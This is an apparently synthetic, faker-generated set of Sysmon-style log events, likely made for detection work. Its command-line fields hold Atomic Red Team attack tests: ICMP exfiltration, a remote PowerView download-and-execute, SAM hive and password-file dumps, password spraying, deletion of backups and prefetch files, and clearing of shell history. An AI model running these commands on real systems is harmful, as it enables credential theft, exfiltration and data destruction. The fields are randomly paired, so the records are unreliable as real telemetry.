        "SourceImage": "C:\\Users\\Public\\individual..exe",
        "DestinationProcessID": 3144,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\somebody..exe",
        "UtcTime": "2024-05-17T01:36:51.720797Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-63.lee-ball.biz",
        "User": "dustinwalker",
        "ProcessID": 6751,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\\\"#{ip_address}\\\", 1500, $Data) }\\n\",",
        "LogonID": 788174,
        "LogonGuid": "91805290-c6ca-4f10-b5d4-8d8c09d97315",
        "SourceProcessID": 6996,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\season..exe",
        "DestinationProcessID": 9957,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\one..exe",
        "UtcTime": "2024-05-17T01:36:51.720797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-20.fisher.net",
        "User": "jennifer81",
        "ProcessID": 1533,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\\n\",",
        "LogonID": 919094,
        "LogonGuid": "3ac6f6b9-28f2-47ad-9e89-87e0ef2a56f9",
        "SourceProcessID": 3446,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\particularly..dll",
        "DestinationProcessID": 6180,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\prepare..exe",
        "UtcTime": "2024-05-17T01:36:51.720797Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-85.fuentes-williams.com",
        "User": "katherine49",
        "ProcessID": 4595,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"net user $ ATOMIC123! /add /active:yes\",",
        "LogonID": 218941,
        "LogonGuid": "816545b8-341c-4a16-95b9-05d79889d570",
        "SourceProcessID": 3210,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\involve..exe",
        "DestinationProcessID": 5895,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\heart..exe",
        "UtcTime": "2024-05-17T01:36:51.720797Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-45.zamora-kramer.com",
        "User": "thomasmorrison",
        "ProcessID": 6061,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$ipAddr = \\\"#{ip_address}\\\"\\nif ($ipAddr -eq \\\"\\\") {\\n    # Assumes the \\\"primary\\\" interface is shown at the top\\n    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\\n    Write-Host \\\"[i] Using Interface $interface\\\"\\n    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\\n}\\nWrite-Host \\\"[i] Base IP-Address for Subnet: $ipAddr\\\"\\n$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\\n# Always assumes /24 subnet\\nWrite-Host \\\"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\\\"\\n\\n$ports = #{port_list}\\n$subnetIPs = 1..254 | ForEach-Object { \\\"$subnetSubstring$_\\\" }\\n\\nforeach ($ip in $subnetIPs) {\\n    foreach ($port in $ports) {\\n      try {\\n          $tcp = New-Object Net.Sockets.TcpClient\\n          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null\\n      } catch {}\\n      if ($tcp.Connected) {\\n          $tcp.Close()\\n          Write-Host \\\"Port $port is open on $ip\\\"\\n      }\\n    }\\n}\\n\",",
        "LogonID": 919329,
        "LogonGuid": "88d688b4-8cff-4f0b-86b4-b8a77e348d7a",
        "SourceProcessID": 6603,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\official..dll",
        "DestinationProcessID": 9117,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\piece..exe",
        "UtcTime": "2024-05-17T01:36:51.721798Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-24.davis-ashley.com",
        "User": "bowmanrobert",
        "ProcessID": 6615,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"ldifde.exe -f #{output_path}\\\\#{output_file} -p subtree\\n\",",
        "LogonID": 511907,
        "LogonGuid": "6f51232a-8840-46af-93d5-16a0f87beaf8",
        "SourceProcessID": 4756,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\pass..dll",
        "DestinationProcessID": 2483,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\care..dll",
        "UtcTime": "2024-05-17T01:36:51.721798Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-15.williams-paul.com",
        "User": "anthonystephanie",
        "ProcessID": 5036,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$wdApp = New-Object -COMObject \\\"Word.Application\\\"\\nif(-not $wdApp.path.contains(\\\"Program Files (x86)\\\"))  \\n{\\n  Write-Host \\\"64-bit Office\\\"\\n  reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\\" /t REG_SZ /d \\\"PathToAtomicsFolder\\\\T1137.002\\\\bin\\\\officetest_x64.dll\\\" /f       \\n}\\nelse{\\n  Write-Host \\\"32-bit Office\\\"\\n  reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf\\\" /t REG_SZ /d \\\"PathToAtomicsFolder\\\\T1137.002\\\\bin\\\\officetest_x86.dll\\\" /f\\n}\\nStop-Process -Name \\\"WinWord\\\" \\nStart-Process \\\"WinWord\\\"\\n\",",
        "LogonID": 413587,
        "LogonGuid": "54db43be-2365-42cb-a2b1-83963530038c",
        "SourceProcessID": 3595,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\several..exe",
        "DestinationProcessID": 5679,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\woman..exe",
        "UtcTime": "2024-05-17T01:36:51.721798Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-91.lee.info",
        "User": "tmeyers",
        "ProcessID": 9240,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"echo #{bash_encoded} | base64 -d | bash\\necho #{dash_encoded} | base64 -d | bash\\necho #{fish_encoded} | base64 -d | bash\\necho #{sh_encoded} | base64 -d | bash\\n\",",
        "LogonID": 522533,
        "LogonGuid": "ca4f37a4-fdb5-4d6f-b58f-7f82483405b5",
        "SourceProcessID": 8302,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\benefit..dll",
        "DestinationProcessID": 6201,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\medical..dll",
        "UtcTime": "2024-05-17T01:36:51.721798Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-84.williams.com",
        "User": "aprilrhodes",
        "ProcessID": 5032,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo '#{text_to_append}' >> ~/.profile\\n\",",
        "LogonID": 689550,
        "LogonGuid": "6f898073-d8e9-47c3-a6e9-3fb0a40218fe",
        "SourceProcessID": 9763,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\behavior..exe",
        "DestinationProcessID": 7518,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\law..exe",
        "UtcTime": "2024-05-17T01:36:51.722798Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-45.stevens-smith.info",
        "User": "fprice",
        "ProcessID": 6095,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo cp #{script_location} #{script_destination}\\nsudo touch /private/var/db/emondClients/#{empty_file}\\n\",",
        "LogonID": 966606,
        "LogonGuid": "151edb14-4868-46cb-b899-362f09dc8c03",
        "SourceProcessID": 7625,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\realize..dll",
        "DestinationProcessID": 9693,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\worker..exe",
        "UtcTime": "2024-05-17T01:36:51.722798Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-40.johnson.com",
        "User": "jocelyn72",
        "ProcessID": 5602,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"function Invoke-dpsLight ($Password, $userlist) {\\n$users = Get-Content $userlist\\n$Domain = \\\"LDAP://\\\" + ([ADSI]\\\"\\\").distinguishedName\\nforeach ($User in $users) {\\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\\n  if ($Domain_check.name -ne $null) {\\n    Write-Host -ForegroundColor Green \\\"Password found for User:$User Password:$Password\\\"\\n  }\\n  else { Write-Host \\\". \\\" -NoNewline}\\n}\\nWrite-Host -ForegroundColor green \\\"Finished\\\"\\n}\\nInvoke-dpsLight \\\"#{password}\\\" $env:Temp\\\\usersdpsLight.txt\\n\",",
        "LogonID": 451864,
        "LogonGuid": "f1b4a8d4-d32a-480f-bffd-07a9d6fdee85",
        "SourceProcessID": 3061,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\boy..dll",
        "DestinationProcessID": 6062,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\art..exe",
        "UtcTime": "2024-05-17T01:36:51.722798Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-41.scott.com",
        "User": "randy52",
        "ProcessID": 4246,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"vaultcmd /listcreds:\\\"Windows Credentials\\\"\\n\",",
        "LogonID": 579592,
        "LogonGuid": "abd36cd9-0306-4386-9995-ac8813aff3d0",
        "SourceProcessID": 5342,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\expert..exe",
        "DestinationProcessID": 2671,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\us..dll",
        "UtcTime": "2024-05-17T01:36:51.722798Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-44.nelson.com",
        "User": "moralesryan",
        "ProcessID": 2118,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/logfile= /logtoconsole=false `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 383483,
        "LogonGuid": "69b6786d-0884-4d52-a6f5-a6aaaa35c349",
        "SourceProcessID": 1658,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\defense..exe",
        "DestinationProcessID": 1271,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\reason..dll",
        "UtcTime": "2024-05-17T01:36:51.723797Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-16.jones-meyer.org",
        "User": "russell73",
        "ProcessID": 4107,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"del /s /f /q c:\\\\*.VHD c:\\\\*.bac c:\\\\*.bak c:\\\\*.wbcat c:\\\\*.bkf c:\\\\Backup*.* c:\\\\backup*.* c:\\\\*.set c:\\\\*.win c:\\\\*.dsk\\n\",",
        "LogonID": 884318,
        "LogonGuid": "770e895a-92e2-47be-9fdf-a5340e43d226",
        "SourceProcessID": 7094,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\miss..dll",
        "DestinationProcessID": 6149,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\baby..exe",
        "UtcTime": "2024-05-17T01:36:51.723797Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-33.vaughan.biz",
        "User": "sanchezleonard",
        "ProcessID": 8343,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Remove-Item -Path (Join-Path \\\"$Env:SystemRoot\\\\prefetch\\\\\\\" (Get-ChildItem -Path \\\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\\" -Name)[0])\\n\",",
        "LogonID": 532677,
        "LogonGuid": "ef78da0e-10df-46d3-a1d9-3b58bd155dbb",
        "SourceProcessID": 3117,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\write..exe",
        "DestinationProcessID": 9880,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\show..exe",
        "UtcTime": "2024-05-17T01:36:51.723797Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-84.smith-ortega.com",
        "User": "lmartin",
        "ProcessID": 4857,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"Set-ItemProperty HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force\",",
        "LogonID": 962936,
        "LogonGuid": "44a747b3-bd3f-4620-a5a9-15df0596e012",
        "SourceProcessID": 4743,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\year..exe",
        "DestinationProcessID": 3363,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\part..dll",
        "UtcTime": "2024-05-17T01:36:51.723797Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-85.colon.info",
        "User": "christopher50",
        "ProcessID": 1429,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"TEST=$(echo $HISTCONTROL)\\nif [ \\\"$HISTCONTROL\\\" != \\\"ignoreboth\\\" ]; then export HISTCONTROL=\\\"ignoreboth\\\"; fi\\nhistory -c \\nls -la $HISTFILE # \\\" ls -la $HISTFILE\\\"\\nif [ $(history |wc -l) -eq 1 ]; then echo \\\"ls -la is not in history cache\\\"; fi\\n# -> ls -la is not in history cache\\nif [ \\\"$HISTCONTROL\\\" != \\\"erasedups\\\" ]; then export HISTCONTROL=\\\"erasedups\\\"; fi\\nhistory -c \\nls -la $HISTFILE\\nls -la $HISTFILE\\nls -la $HISTFILE\\nif [ $(history |wc -l) -eq 2 ]; then echo \\\"Their is only one entry for ls -la $HISTFILE\\\"; fi\\n\",",
        "LogonID": 760052,
        "LogonGuid": "59258ff7-ee63-4c0f-b4a3-6ac3d0adb5db",
        "SourceProcessID": 6266,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\hot..exe",
        "DestinationProcessID": 9750,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\identify..exe",
        "UtcTime": "2024-05-17T01:36:51.724797Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-37.barnes.info",
        "User": "robertmoore",
        "ProcessID": 7385,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cp #{payload} /tmp/hello.c\\nsudo chown root /tmp/hello.c\\nsudo make /tmp/hello\\nsudo chown root /tmp/hello\\nsudo chmod u+s /tmp/hello\\n/tmp/hello\\n\",",
        "LogonID": 609062,
        "LogonGuid": "c6d64d40-1b71-43a9-9536-7d0b7f15c8f1",
        "SourceProcessID": 5975,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\much..dll",
        "DestinationProcessID": 9393,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\health..exe",
        "UtcTime": "2024-05-17T01:36:51.724797Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-46.mills-nguyen.org",
        "User": "qgregory",
        "ProcessID": 4278,
        "ProcessName": "malware.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\T1027.006\\\\bin\\\\T1027_006_remote.html\\\"\\n\",",
        "LogonID": 585134,
        "LogonGuid": "f5c1ee45-9c71-47d8-afe5-775633405e92",
        "SourceProcessID": 1184,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\run..dll",
        "DestinationProcessID": 5999,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\theory..dll",
        "UtcTime": "2024-05-17T01:36:51.724797Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-37.smith.info",
        "User": "christopher63",
        "ProcessID": 4389,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo cat /etc/master.passwd > #{output_file}\\ncat #{output_file}\\n\",",
        "LogonID": 539084,
        "LogonGuid": "e2782eea-9069-4eb4-ae73-ab91b84af326",
        "SourceProcessID": 8529,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\learn..exe",
        "DestinationProcessID": 3017,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\television..dll",
        "UtcTime": "2024-05-17T01:36:51.724797Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-99.wheeler.com",
        "User": "odonnellmichael",
        "ProcessID": 4262,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"reg save HKLM\\\\sam %temp%\\\\sam\\nreg save HKLM\\\\system %temp%\\\\system\\nreg save HKLM\\\\security %temp%\\\\security\\n\",",
        "LogonID": 904988,
        "LogonGuid": "38826978-c43f-4e38-98c7-798ee22e8b59",
        "SourceProcessID": 4335,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\east..dll",
        "DestinationProcessID": 3310,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\she..dll",
        "UtcTime": "2024-05-17T01:36:51.724797Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-18.reed.org",
        "User": "todd33",
        "ProcessID": 4701,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}\",",
        "LogonID": 876708,
        "LogonGuid": "e3d14e32-e377-4c07-bc45-1637cd48f8c1",
        "SourceProcessID": 2162,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\its..exe",
        "DestinationProcessID": 3657,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\from..dll",
        "UtcTime": "2024-05-17T01:36:51.725803Z"
    },
